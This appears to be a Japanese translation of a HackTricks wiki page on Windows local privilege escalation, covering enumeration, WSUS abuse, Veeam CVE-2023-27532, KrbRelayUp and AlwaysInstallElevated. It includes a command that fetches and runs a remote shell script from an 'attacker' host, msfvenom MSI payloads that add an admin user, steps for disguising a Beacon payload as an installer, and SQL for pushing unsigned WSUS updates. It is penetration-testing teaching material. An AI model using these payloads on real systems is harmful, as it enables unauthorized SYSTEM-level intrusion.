# Windows ローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windows ローカル権限昇格のベクトルを探すのに最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

このページでは、いくつかの基礎的なガイドに基づく Windows 権限昇格の一般的な方法論をまとめています。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 実践的な列挙の流れは、コミュニティのワークショップやチェックリストも参考にしています。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 過去の攻撃手法に関する資料には、Windows 権限昇格を扱った DerbyCon のプレゼンテーションが含まれています。<sup>[[5]](#references)</sup>

## Windows の基本理論

### Access Tokens

**Windows access token について知らない場合は、続ける前に以下のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、以下のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity level について知らない場合は、続ける前に以下のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows のセキュリティ制御

Windows には、**システムの列挙**や実行ファイルの起動を**妨げたり、**あなたの活動を**検知したりするものがいくつかあります。権限昇格の列挙を始める前に、以下の**ページ**を**読み**、これらすべての**防御**メカニズムを**列挙**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

物理アクセスがあれば、オフラインでの UEFI NVRAM 編集を、起動前の DMA と Windows `SYSTEM` メモリのパッチ適用につなげることもできます:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess によるサイレント昇格

`RAiLaunchAdminProcess` 経由で起動した UIAccess プロセスは、AppInfo の secure-path チェックを回避すると、プロンプトなしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection バイパス手順はこちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop のアクセシビリティレジストリ伝播は、任意の SYSTEM レジストリ書き込み（RegPwn）に悪用できます:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows ビルドでは、特権を持つローカル NTLM 認証が再利用された SMB TCP 接続経由でリフレクトされる、**SMB 任意ポート**を利用した LPE 経路も導入されました:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## システム情報

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性がないか確認してください（適用済みのパッチも確認してください）。

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### バージョン別Exploit

この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoftのセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700件を超えるセキュリティ脆弱性が登録されており、Windows環境が**massive attack surface**を持つことがわかります。

**システム上で**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OSのビルド、インストール済み更新プログラム、候補となるアドバイザリを一覧表示します。結果が該当するものとして扱う前に、正確な製品と後継の更新プログラムを確認してください。

バージョン固有のローカルExploitを調べる場合は、OSのアーキテクチャだけでなく、**実行中のプロセスのアーキテクチャ**も確認してください。64-bit Windowsでは、32-bitプロセスは[WOW64ファイルシステムリダイレクト](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector)の影響を受けます。通常、`%windir%\System32`は32-bitのシステムディレクトリに解決されますが、`%windir%\Sysnative`を使うと、そのプロセスからネイティブのシステムディレクトリにアクセスできます。このエイリアスは64-bitプロセスでは利用できません。OSビルドや未適用KBの候補が見つかっても、Exploit可能であることの証明にはなりません。実行中のビルド、インストール済みまたは後継の更新プログラム、プロセスのアーキテクチャ、Exploitの前提条件を、該当する問題の[Microsoftセキュリティ情報](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)と照合してください。

**システム情報を使ってローカルで**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**ExploitのGitHubリポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に保存された認証情報やJuicyな情報はありますか？

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell の履歴

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell トランスクリプトファイル

有効にする方法については、[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)を参照してください。

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` はあくまで例です。[PowerShell の文字起こしポリシー](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription)では通常、各ユーザーの Documents フォルダーに出力されますが、`OutputDirectory` の設定や `Start-Transcript -OutputDirectory` によって、共有フォルダーや隠しフォルダーにファイルを出力することもできます。文字起こしファイルを確認する前に、実際の出力先とファイルの ACL を確認してください。ファイルにはコマンドの引数や出力が記録され、認証情報が含まれる可能性があります。文字起こしファイルを読めることが手がかりとなるのは、その内容から利用可能な高権限の ID が判明し、かつその ID で該当するコンテキストにログオンできる場合に限られます。

### PowerShell モジュール ロギング

PowerShell のパイプライン実行の詳細が記録されます。これには、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、実行の詳細や出力結果がすべて記録されるとは限りません。

これを有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、「Powershell Transcription」ではなく **「Module Logging」** を選択してください。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShell のログから直近の15件のイベントを表示するには、次を実行します。

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

スクリプトの実行内容と全記録が取得され、コードの各ブロックが実行時に確実に記録されます。このプロセスにより各アクティビティの包括的な監査証跡が保持され、フォレンジックや悪意ある挙動の分析に役立ちます。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な知見が得られます。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block のログイベントは、Windows Event Viewer の次のパスで確認できます: **アプリケーションとサービス ログ > Microsoft > Windows > PowerShell > Operational**。\
直近の 20 件のイベントを表示するには、次を使用します:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### インターネット設定

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ドライブ

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP の WSUS エンドポイントは、更新メタデータの傍受を調査する手掛かりになります。悪用できるかどうかは、クライアントがその WSUS サーバーを使用しているか、攻撃者が通信を傍受または制御できるか、さらにクライアントの更新に関する信頼設定とインストールポリシーにも左右されます。URL だけではコード実行が可能だとは判断できません。[Microsoft は WSUS メタデータに TLS を推奨しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus)。

まず、次のコマンドを cmd で実行し、ネットワークが SSL なしの WSUS 更新を使用しているか確認します。

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

または、PowerShellで次のようにします:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

次のような返信が返ってきた場合:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

また、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` の値が `1` の場合です。

`UseWUServer` が `1` の場合、Windows Update は設定されたイントラネットサービスを使用します。これは HTTP interception の経路に必要な前提条件を確認するものですが、interception、悪意のある更新プログラムの受け入れ、または昇格された権限でのインストールが可能であることを証明するものではありません。`0` の場合、このポリシーで設定された WSUS エンドポイントは選択されません。

この脆弱性を exploit するには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) などのツールを使用できます。これらは、非 SSL の WSUS 通信に「偽の」更新プログラムを注入するための、MiTM 用に weaponize された exploit スクリプトです。

調査資料はこちらです。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**レポート全文はこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
基本的に、このバグが exploit する欠陥は次のとおりです。

> ローカルユーザーのプロキシを変更でき、Windows Updates が Internet Explorer の設定で構成されたプロキシを使用する場合、[PyWSUS](https://github.com/GoSecure/pywsus) をローカルで実行して自分自身の通信を intercept し、アセット上で昇格されたユーザーとしてコードを実行できます。
>
> さらに、WSUS サービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。WSUS ホスト名の自己署名証明書を生成し、その証明書を現在のユーザーの証明書ストアに追加すると、HTTP と HTTPS の両方の WSUS 通信を intercept できます。WSUS は、証明書に対する trust-on-first-use 型の検証を実装する HSTS のような仕組みを使用していません。提示された証明書がユーザーによって信頼され、正しいホスト名を持つ場合、サービスはその証明書を受け入れます。

この脆弱性は、ツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（公開後）を使って exploit できます。

### WSUS 管理者が制御する更新プログラム

現在の ID に WSUS サーバー上で更新プログラムを**公開および承認する**権限がある場合は、別の経路が存在します。サーバーの `WSUS Administrators` グループへの実効的な所属状況と、委任された WSUS 権限を確認し、承認された更新プログラムを受け取るクライアントコンピューターグループを特定してください。[Microsoft は更新プログラムの承認に WSUS Administrator 権限を要求しており](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate)、[公開時の信頼関係についても説明しています](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29)。クライアントは、ローカルで公開されたコンテンツの署名に使用された証明書を信頼する必要があります。この経路での権限昇格と判断する前に、候補の更新プログラムに署名があり、受け入れられること、対象に適用可能であること、より高い権限のコンテキストでインストールされることを確認してください。HTTP の `WUServer` 値やグループ名だけでは、これらの条件を満たすことの証明にはなりません。

### SUSDB のカスタム更新プログラム悪用：`.txt`/`.esd` による未署名ペイロード

これは HTTP WSUS 接続を intercept する攻撃とは異なる、信頼境界の不備です。前提条件は、カスタム更新プログラムを公開および承認するための **WSUS データベース（`SUSDB`）のストアドプロシージャ**への十分なアクセス権です。実用的な侵入経路の一つは、上流 WSUS のコンピューターアカウントを、中継先の `SUSDB` をホストする別の MSSQL サーバーへリレーする方法です。正確な前提条件は環境によって異なるため、SQL administrator 権限があると決めつけず、まず `EXECUTE` 権限を列挙してください。<sup>[[38]](#references)[[39]](#references)</sup>

WSUS クライアントの認証を HTTP/8530 から LDAP、SMB、または AD CS へリレーする別の攻撃経路については、[Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8) を参照してください。

#### 更新プログラムのビルド、対象指定、承認

カスタム更新プログラムのワークフローでは、制限された公開 API として正規の WSUS プロシージャを使用します。重要な状態遷移は次のとおりです。<sup>[[38]](#references)</sup>

| Stage | Relevant stored procedures |
| --- | --- |
| 更新プログラムのメタデータをインポート | `spImportUpdate` |
| 前提条件、ローカライズ済み XML 断片、拡張 XML 断片を保存 | `spSaveXMLFragment` |
| コンテンツのダイジェストを攻撃者が制御する URL に関連付け | `spSetBatchURL` |
| コンピューターグループを列挙／作成し、クライアントを追加 | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| そのグループへのインストールを承認 | `@actionID = 0` および `@isAssigned = 1` を指定した `spDeployUpdate` |

ファイル名、ダイジェスト、サイズ、および `CommandLineInstallation` ハンドラーは、インポートしたメタデータ／断片間で一致している必要があります。コンテンツ URL と対象グループを割り当てた後、最終的な承認は次のようになります。例の GUID を再利用せず、新しい更新プログラム、グループ、デプロイメントの識別子を使用してください。<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### 拡張子による署名バイパス

WSUS は通常、任意の未署名の実行可能コンテンツを拒否します。しかし、`C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` 内の .NET `VerifyFile` パスでは、指定されたファイル名が `.txt` または `.esd` で終わる場合、証明書チェックフラグが false に設定されます。その結果、バイト列がテキストまたは正規の ESD イメージであることを事前に確認せずに `CheckCertificateSignature` がスキップされます。したがって、たとえば `payload.exe.txt` という名前を付けた変更されていない PE ファイルは、コンテンツ検証を通過し、その後、更新プログラムのコマンドラインインストールハンドラーによって起動される可能性があります。これは署名偽造ではなく、ポリシーと型の混同によるバグです。<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS互換のステージングと自動化

`spDeployUpdate`を呼び出すと、WSUSは登録済みコンテンツを取得します。配信元はBITSのHTTP要件を満たす必要があります。URLにアクセスできるだけでは不十分で、転送では最初に`HEAD`/`GET`フローが実行され、その後バイト範囲リクエストが使われます。Rangeをサポートしていないサーバーでは、BITSにRangeプロトコルヘッダーが必要であることを示すWSUS同期の`EventId=364`が発生します。<sup>[[39]](#references)</sup>

調査用PoCの[NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)は、import/fragment/URL/group/deploymentチェーンに必要なSQLを生成し、実行用の改変済みMSSQLクライアントを含み、コンテンツのステージング用に`BitsWebServer.py`を同梱しています。認可済みラボでの最小限の実行例は次のとおりです。<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### 無人実行と再試行による永続化

クライアント側の操作はポリシーに依存します。`Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` のオプション `4 - Auto download and schedule install` を設定すると、承認済みの更新プログラムがダウンロードされ、設定されたスケジュールに従ってインストールされます。ユーザーが手動で選択する必要はありません。テストでは、更新プログラムが失敗または未完了のままだったペイロードは、コールバックプロセスの終了後すぐに再提示されたため、再試行の挙動が繰り返し実行される永続化につながる可能性があります。ただし、クライアントに更新失敗の状態が表示されるため、目立ちます。<sup>[[39]](#references)</sup>

#### 検出とハードニングの着眼点

このチェーンでサーバー側およびクライアント側から調査する際に役立つ着眼点は次のとおりです。<sup>[[39]](#references)</sup>

- `SUSDB` における `spCreateTargetGroup`、`spSetBatchURL`、`spDeployUpdate` の実行を監査します。新しいターゲットグループ、外部コンテンツの配信元、`.txt`/`.esd` の更新ペイロード、予期しないプリンシパル（特にコンピューターアカウント以外）によるデプロイを調査します。
- `C:\Program Files\Update Services\LogFiles` で `ContentSyncAgent`、`FileVerified`、スペルミスのある `FileVerficationFailed`、`EventId=364` を確認し、拡張子を鵜呑みにせず、検証イベントとペイロードの拡張子およびコンテンツのマジックナンバーを照合します。
- Windows Update のインストールが繰り返し失敗・再試行される挙動、および `.txt` または `.esd` の名前が付いたコンテンツからの PE 実行や予期しない子プロセス・ネットワーク活動を探します。
- 対応している場合はデータベースサービスで Extended Protection for Authentication を必須にし、データベースへのネットワークアクセスを WSUS サーバーと認可済みの管理システムに制限します。カスタム更新プロシージャに対する `EXECUTE` 権限を最小限にし、監査します。

## サードパーティ製自動更新ツールと Agent IPC（local privesc）

多くのエンタープライズエージェントは、localhost の IPC サーフェスと特権付きの更新チャネルを公開しています。登録先を攻撃者のサーバーに誘導でき、アップデーターが不正な root CA または弱い署名者チェックを信頼する場合、ローカルユーザーは悪意のある MSI を配信し、SYSTEM サービスにインストールさせることができます。一般化した手法（Netskope stAgentSvc チェーン – CVE-2025-0309 に基づく）については、こちらを参照してください。


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532（TCP 9401 経由で SYSTEM）

Veeam Backup & Replication と Cloud Connect は、デフォルトで **TCP/9401** 上のコアバックアップサービスを使用します。[Veeam のアドバイザリ](https://www.veeam.com/kb4424)では、バックアップネットワークの境界内で、暗号化された構成データベースの認証情報が認証なしで漏えいすることが説明されています。別の公開 PoC では、**NT AUTHORITY\SYSTEM** としてコマンドを実行する経路が示されています。<sup>[[12]](#references)</sup> サービスは localhost 以外にもバインドされる可能性があるため、実際のアドレスと PID を確認してください。

- **Recon**: TCP/9401 が `Veeam.Backup.Service.exe` に属することを確認し、インストール済みの製品とパッチのメタデータを調べます。`netstat -ano | findstr 9401` と `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` は手掛かりであり、完全なパッチ確認にはなりません。
- **修正済みの最小バージョン**: Veeam は **11a build 11.0.1.1261 P20230227** と **12 build 12.0.0.1420 P20230223** を最初の修正済みリリースとして挙げており、それ以前のリリースは影響を受けます。4つの要素からなるファイルバージョンだけでは、未パッチのベースビルドと、同じビルド番号に対する後続パッチを区別できません。境界となるビルドを修正済みと判断する前に、パッチ識別子を[ベンダーのビルド履歴](https://www.veeam.com/kb2680)で確認してください。
- **Exploit**: `VeeamHax.exe` などの PoC を必要な Veeam DLL と同じディレクトリに配置し、ローカルソケット経由で SYSTEM ペイロードをトリガーします。

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

引用された PoC は、追加の前提条件が満たされた場合に SYSTEM としてコマンドを実行できることを示しています。ベンダーのアドバイザリでは、認証情報の漏えいに関する問題が説明されています。
## KrbRelayUp

ローカル Kerberos relay では、適切な COM server が認証を行い、中継された principal が対象オブジェクトへの書き込み権限を持つ場合、低い権限のログオンから、特権を要するディレクトリ書き込みへと権限を引き上げられます。[KrbRelay のドキュメント](https://github.com/cube0x0/KrbRelay)には、RBCD と `msDS-KeyCredentialLink`（shadow-credential）の LDAP 書き込みが記載されています。KrbRelayUp は、これらの一部の手法を自動化します。RBCD の手順には、該当する委任設定と対象オブジェクトへの権限が必要です。一方、shadow-credential の手順には、key-credential の書き込み権限と、証明書認証経路をサポートする KDC が必要です。どちらの手順も、ドメインに参加しているだけで可能になるものではありません。

実際の DC の [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) と [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) のポリシー、中継される ID のオブジェクト ACL、選択した COM クラスの認証レベルと偽装レベルを確認してください。呼び出し元のログオンの種類と認証情報のコンテキストも重要です。WinRM セッションは、対話型ログオンや新しい資格情報を使ったログオンとは異なる挙動をする場合があります。ファイアウォール/OXID ルーティングやインストール済みの更新プログラムによっても結果が変わることがあります。許可的なポリシーや一致する ACL は、確認が必要な候補として扱ってください。受動的な列挙によって、COM coercion、中継認証、またはディレクトリへの書き込みを発生させてはなりません。マシンアカウントの shadow credential はマシンチケットにつながる可能性があり、そのアカウントが必要なディレクトリ複製権限を持つ場合に限り、別の DCSync 経路につながることもあります。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) で**exploit を**確認してください。

攻撃の流れについて詳しくは、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>を確認してください。

## AlwaysInstallElevated

**これら 2 つのレジストリ値が有効**（値が **0x1**）になっている場合、どの権限のユーザーでも `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール**（実行）できます。

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

meterpreter session がある場合は、module **`exploit/windows/local/always_install_elevated`** を使ってこの手法を自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` command を使うと、権限昇格用の Windows MSI binary を現在のディレクトリに作成できます。この script は、ユーザー/グループの追加を求める precompiled MSI installer を書き出します（そのため、GIU access が必要です）：

```
Write-UserAddMSI
```

作成したバイナリを実行するだけで、privileges を escalate できます。

### MSI Wrapper

このツールを使って MSI wrapper を作成する方法は、このチュートリアルを読んでください。「**.bat**」ファイルをラップすれば、**command lines** の**実行**だけを行うこともできます。


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX で MSI を作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio で MSI を作成

- Cobalt Strike または Metasploit で、新しい Windows EXE TCP payload を `C:\privesc\beacon.exe` に**生成**します。
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに「installer」と入力します。**Setup Wizard** プロジェクトを選択し、**Next** をクリックします。
- プロジェクト名（例: **AlwaysPrivesc**）を入力し、場所に **`C:\privesc`** を指定して、**place solution and project in the same directory** を選択し、**Create** をクリックします。
- 手順 3/4（含めるファイルの選択）に進むまで **Next** をクリックします。**Add** をクリックして、先ほど生成した Beacon payload を選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
  - **Author** や **Manufacturer** などのプロパティも変更でき、インストールするアプリをより正規のものに見せることができます。
- プロジェクトを右クリックし、**View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これにより、インストーラーの実行と同時に Beacon payload が実行されます。
- **Custom Action Properties** で、**Run64Bit** を **True** に変更します。
- 最後に、**ビルドします**。
  - 警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` が表示された場合は、プラットフォームが x64 に設定されていることを確認してください。

### MSI のインストール

悪意のある `.msi` ファイルを**バックグラウンドで**インストールするには:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

これらの設定によって**ログに記録される内容**が決まるため、注意が必要です。

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwardingでは、ログがどこに送信されるのかを知っておくと便利です。

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**は、ドメインに参加しているコンピューターの**ローカル Administrator パスワードを管理**するために設計されており、各パスワードが**一意でランダムに生成され、定期的に更新される**ようにします。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、許可されたユーザーはローカル admin パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードは LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページで WDigest の詳細を確認できます**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) の保護を強化し、信頼されていないプロセスによる**メモリの読み取り**やコードの挿入を**ブロック**して、システムのセキュリティをさらに強化しました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash 攻撃などの脅威からデバイスに保存された認証情報を保護することです。[**Credential Guard の詳細はこちらをご覧ください。**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### キャッシュされた資格情報

**ドメイン資格情報**は**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**キャッシュされた資格情報の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属しているグループに興味深い権限がないか確認してください。

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### 特権グループ

**特権グループに所属している場合、権限昇格できる可能性があります**。特権グループと、それを悪用して権限昇格する方法についてはこちらをご覧ください。


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

このページで**token**について**詳しく学びましょう**：[**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
次のページで**興味深いtoken**と、その悪用方法について確認してください。


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログイン中のユーザー / セッション

```bash
qwinsta
klist sessions
```

### ホームフォルダー

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### パスワードポリシー

```bash
net accounts
```

### クリップボードの内容を取得する

```bash
powershell -command "Get-Clipboard"
```

## 実行中のプロセス

### ファイルとフォルダーのアクセス許可

